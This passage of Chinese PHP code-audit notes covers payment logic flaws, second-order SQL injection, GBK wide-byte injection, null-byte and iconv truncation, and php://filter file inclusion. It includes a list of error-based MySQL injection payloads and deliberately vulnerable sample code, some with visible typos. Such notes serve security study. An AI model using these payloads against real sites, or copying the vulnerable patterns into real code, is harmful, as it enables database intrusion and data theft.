> > 	```
> >     
> > 	test依旧会被输出，替换成安装流程，PHP依旧会进行
> > 
> > 2. 支付漏洞
> >     
> > 	- 客户端修改单价
> > 	- 客户端修改总价和购买数量
> > 	- 服务端未校验严格
> > 	- 重复发包利用时间差
> > 		
> >         ```php
> > 		#!php
> > 			<?php
> > 			if (check_money($price)) {
> > 				//Do something
> > 				//花费几秒
> > 				$money = $money - $price;
> > 			}
> > 		?>
> > 		```
> > 	
> >     - 可能导致漏洞函数
> >         
> > 		`str_replace()`
> > 		
> >         ```php
> > 		<?php
> > 			//省略
> > 			$order_sn = str_replace($_GET['subject'],'',$_GET['out_trade_no']);
> > 			$order_sn = trim($order_sn);
> > 			if(!check_money($order_sn,$_GET['total_fee'])) {
> > 				//省略
> > 			}
> > 			function check_money($log_id,$money) {
> > 				$sql = "SELECT order_amount FROM xx WHERE log_id = '".$log_id."'";
> > 				//省略
> > 			}
> > 		?>
> > 		```
> >         
> >         ```php
> > 		#!php
> > 		<?php
> > 			$a = addslashes($_GET['a']);
> > 			$b = addslashes($_GET['b']);
> > 			echo "$a<br>$b<br>";
> > 			$c = str_replace($a,'',$b);
> > 			echo trim($c);
> > 		?>
> > 		```
> > 
> > 3. 会话认证漏洞
> > 
> > 	cookie验证：没有使用session验证，将信息直接保存在cookie中，找到传入sql语句的参数的传递过程，回溯变量到最原始的函数，看它保存在cookie的算法是否可逆，和md5比起，sha1更安全，解密sha1的网站更少，限制一个用户只能同时在一个IP上登录，审计代码时，查看登录处的代码
> 
> 3. 二次漏洞
> 
> > 1. 类型
> > 	不是逻辑问题，业务逻辑复杂度，与二次漏洞触发率成正比
> > 	
> >     购物车/订单引用数据/文章编辑/草稿 = SQL注入/XSS
> > 	
> >     ```php
> > 	<?php
> > 		$conn = mysql_connect("localhost","root","root");
> > 		mysql_select_db("test",$sonn);
> > 		$a = addslashes($_POST['pwd']);
> > 		if(!empty($a) && isset($_POST['sub'])) {
> > 			$sql1 = "UPDATE user SET password = '".$a."' WHERE name = 'sixwhale'";
> > 			$sql2 = "SELECT * FROM user WHERE name = 'sixwhale'";
> > 			if(mysql_query($sql1)) {
> > 				echo "update ok<br>";
> > 			}
> > 			else {
> > 				echo mysql_error();
> > 			}
> > 			if($row = mysql_fetch_assoc(mysql_query($sql2))) {
> > 				echo "select ok<br>";
> > 			}
> > 		}
> > 		else {
> > 			echo "no";
> > 		}
> > 		echo "select * from xx where = '".$row['password']."'<br>";
> > 		echo $a;
> > 	?>
> > 	<html>
> > 		<from action="" method="POST">
> > 			<input type="text" name="pwd">
> > 			<input type="submit" name="sub">
> > 		</from>
> > 	</html>
> > 	```
> > 
> > 2. 技巧
> > 	
> >     - 钻GPC等转义的空子
> >         
> > 		- 不受GPC保护的`$_SERVER`变量
> > 		    
> >         	PHP5以后，`$_SERVER`取到的`header`不再受GPC影响，就算开启特殊字符也不会被转义，存在注入
> > 		
> >         - 编码问题转换
> > 		    
> >             GBK的宽字节注入：`%df '`单引号自动被转义成(`%5c`)，同时`%df`与`%5c`连在一起组合成運字单引号依然在，成功闭合(php与mysql交互过程中发生的编码转换问题)
> > 			
> >             `mb_convert_encoding()`
> >             
> > 			```php
> > 			#!php
> > 			<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/> 
> > 			<?php
> > 				$sql = "WHERE id='".urldecode("-1%df%5c' == ")."'"; 
> > 				print_r(mb_convert_encoding($sql,"UTF-8","GBK"));
> > 			?>
> > 			```
> >     
> > 	- 字符串问题(利用报错，找到敏感信息)
> >         
> > 		- 字符串截断
> >             
> > 			- `%00`空字符截断
> > 				
> >                 PHP版本小于5.3
> > 				```php
> > 				#!php
> > 				<?php
> > 					include($_GET['file'].'.php');
> > 					//1.php?file=2.txt%00
> > 					//2.txt里面是 <?php phpinfo()?>
> > 				?>
> > 				```
> >             
> > 			- `iconv`函数字符编码转换截断
> > 				
> >                 对PHP版本有要求
> > 				```php
> > 				#!php
> > 				chr(128)—chr(255)可以截断字符
> > 				<?php 
> > 					$a = '1'.chr(130).'2’; 
> > 					echo $a."<br>";// 1�2
> > 					echo iconv("UTF-8", "GBK", $a);// 1
> > 				?>
> >                 ```
> >         
> > 		- `php://`输入输出流
> >             
> > 			```php
> > 			#!php
> > 			<?php
> > 				include($_GET['file']);
> > 			?>
> > 			1.php?file=php://filter/convert.base64-encode(内容被base64编码)/resource=example.txt(远程文件)
> > 			```
> >         
> > 		- php代码解析标签
> >             
> > 			`<script language="php">…</script>`
> > 			
> >             `<?…?>`：php3.0.4版本后可用
> > 			
> >             `<%…%>`：asp标签，需要`asp_tags=on`，默认是`off`
> >         
> > 		- 正则表达式
> >             
> > 			没有使用`^`和`$`限定匹配开始位置
> > 			
> >             特殊字符未转义
> >         
> > 		- 报错注入
> >             
> > 			```php
> > 			<?php
> > 				¥conn= mysql_connect("localhost","root","root");
> > 				mysql_select_db("test",$conn);
> > 				$sql1 = "SELECT 1 FROM (SELECT count(*),concat(USER(),floor(rand(0)*2)) x FROM
> > 						information_schema.TABLES GROUP BY x) a";
> > 				$sql2 = "SELECT * FROM user WHERE id = 1 and 
> > 						(extractvalue(1,concat(0x5c,(SELECT user()))))";
> > 				$sql3 = "SELECT * FROM user WHERE id = 1 and 
> > 						(updatexml(1.concat(0x5c24,(SELECT user()),0x5e24),1))";
> > 				$sql4 = "SELECT * FROM user WHERE id = 1 and 
> > 						GeometryCollection((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
> > 				$sql5 = "SELECT * FROM user WHERE id = 1 and 
> > 						polygon((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
> > 				$sql6 = "SELECT * FROM user WHERE id = 1 and 
> > 						multipoint((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
> > 				$sql7 = "SELECT * FROM user WHERE id = 1 and 
> > 						multilinestring((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
> > 				$sql8 = "SELECT * FROM user WHERE id = 1 and 
> > 						multiolygon((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
> > 				$sql9 = "SELECT * FROM user WHERE id = 1 and 
> > 						linestring((SELECT * FROM(SELECT * FROM(SELECT user())a)b))";
> > 				$sql10 = "SELECT * FROM user WHERE id = 1 and 
> > 						exp(~(SELECT * FROM(SELECT user())a))";
> > 				$res = mysql_query($sql10);
> > 				if(!res){
> > 					echo mysql_error();
> > 				}
> > 			?>
> > 			```
> >         
> > 		- windows findfirstfile利用
> >             
> > 			若要搜索12345.txt文件，可使用`1<<`来代替或者`12<<`，不可以单独使用一个"`<`"或"`>`"，因为单独一个只是代表了一个字符，两个代表多个字符











